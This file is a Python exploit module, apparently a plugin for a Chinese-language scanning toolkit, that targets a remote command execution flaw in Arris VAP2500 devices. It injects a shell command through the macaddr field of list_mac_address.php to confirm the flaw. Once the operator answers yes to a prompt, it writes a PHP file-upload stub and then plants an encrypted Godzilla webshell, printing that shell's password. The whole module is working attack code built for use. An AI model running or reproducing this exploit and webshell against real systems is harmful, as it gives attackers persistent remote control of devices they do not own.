# body="./images/lg_05_1.gif"
import requests,re,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Arris_VAP2500Rce:
	def randomInt(self,s,e):
		import random
		key=random.randint(int(s),int(e))
		return key
	def randomLowercase(self,n):
		key=""
		zf="qwertyuiopasdfghjklzxcvbnm"
		import random
		for _ in range(n):
			suiji1=random.randint(0,len(zf)-1)
			key+=zf[suiji1]
		return key

	def scan(self,baseurl):
		r1 = self.randomLowercase(6)
		rand = self.randomInt(1000, 9999)
		url=baseurl+"/list_mac_address.php"
		headers = {
				'User-Agent':self.headers,
				'Content-Type':'application/x-www-form-urlencoded'
			}
		data = f'''macaddr=00:00:44:00:00:00;echo+{rand}{r1}>+/var/www/{r1}.php&action=0&settype=1'''
		response = requests.post(url=url,headers=headers,data=data,verify=self.ssl,proxies=self.proxy,timeout=15)
		url=baseurl+f'/{r1}.php'
		headers = {
				'User-Agent':self.headers,
			}
		response = requests.get(url=url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=15)
		if str(rand)+r1 in response.text:
			OutPrintInfoSuc("Arris",f"存在Arris-VAP2500-RCE{url}")
			if self.batch:
				OutPutFile("arris_vap2500_rce.txt",f"存在Arris-VAP2500-RCE{url}")
			return True
		else:
			return False
	def scan2(self,baseurl):
		url=baseurl+"/list_mac_address.php"
		headers = {
				'User-Agent':self.headers,
				'Content-Type':'application/x-www-form-urlencoded'
			}
		data = f'''macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+file_put_contents%28%24_POST%5B%22filename%22%5D%2C+%24_POST%5B%22content%22%5D%29%3F%3E%27%3E+%2Fvar%2Fwww%2Farriscs.php&action=0&settype=1'''
		response = requests.post(url=url,headers=headers,data=data,verify=self.ssl,proxies=self.proxy,timeout=15)
		if response.status_code == 200:
			OutPrintInfo("Arris","[b bright_red]Shell利用文件写入成功")
			OutPrintInfo("Arris",url)
			url2 = baseurl + "/arriscs.php"
			data = f'''filename=airrscd.php&content=%3C%3Fphp+%40session_start%28%29%3B+%40set_time_limit%280%29%3B+%40error_reporting%280%29%3B+function+encode%28%24D%2C%24K%29%7B+for%28%24i%3D0%3B%24i%3Cstrlen%28%24D%29%3B%24i%2B%2B%29+%7B+%24c+%3D+%24K%5B%24i%2B1%2615%5D%3B+%24D%5B%24i%5D+%3D+%24D%5B%24i%5D%5E%24c%3B+%7D+return+%24D%3B+%7D+%24pass%3D%22pass%22%3B+%24payloadName%3D%22payload%22%3B+%24key%3D%223c6e0b8a9c15224a%22%3B+if+%28isset%28%24_POST%5B%24pass%5D%29%29%7B+%24data%3Dencode%28base64_decode%28%24_POST%5B%24pass%5D%29%2C%24key%29%3B+if+%28isset%28%24_SESSION%5B%24payloadName%5D%29%29%7B+%24payload%3Dencode%28%24_SESSION%5B%24payloadName%5D%2C%24key%29%3B+if+%28strpos%28%24payload%2C%22getBasicsInfo%22%29%3D%3D%3Dfalse%29%7B+%24payload%3Dencode%28%24payload%2C%24key%29%3B+%7D+eval%28%24payload%29%3B+echo+substr%28md5%28%24pass.%24key%29%2C0%2C16%29%3B+echo+base64_encode%28encode%28%40run%28%24data%29%2C%24key%29%29%3B+echo+substr%28md5%28%24pass.%24key%29%2C16%29%3B+%7Delse%7B+if+%28strpos%28%24data%2C%22getBasicsInfo%22%29%21%3D%3Dfalse%29%7B+%24_SESSION%5B%24payloadName%5D%3Dencode%28%24data%2C%24key%29%3B%7D%7D%7D%3F%3E'''
			response2 = requests.post(url=url2, headers=headers, data=data, verify=self.ssl,proxies=self.proxy, timeout=15)
			if response2.status_code == 200:
				OutPrintInfo("Arris", "[b bright_red]Shell写入成功")
				OutPrintInfo("Arris", baseurl+"/airrscd.php")
				OutPrintInfo("Arris", "PS：哥斯拉php 密码: pass 加密器：PHP_XOR_BASE64")

	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(header=self.headers, proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("Arris", '开始执行Arris-VAP2500-RCE...')
		if self.scan(url):
			if not self.batch:
				choose = Prompt.ask("[b yellow]是否上传webshell([b bright_red]y/n[/b bright_red])")
				if choose == "y":
					self.scan2(url)

		if not self.batch:
			OutPrintInfo("Arris", 'Arris-VAP2500-RCE执行结束')